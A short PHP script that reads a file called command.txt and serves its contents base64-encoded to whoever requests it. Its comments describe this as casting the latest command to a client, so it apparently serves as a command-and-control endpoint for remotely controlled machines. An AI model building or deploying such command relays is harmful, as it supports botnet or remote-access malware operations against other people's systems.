<?php
// preset commnad log file
$filePath = 'command.txt';

// if it exists...
if (file_exists($filePath)) {
    // read content to get latest command
    $fileContent = file_get_contents($filePath);
    
    // encode command in base-64
    $encodedContent = base64_encode($fileContent);
    
    // cast command to the client
    echo $encodedContent;
} else {
    // verbose error
    echo "File command.txt does not exist.";
}
?>
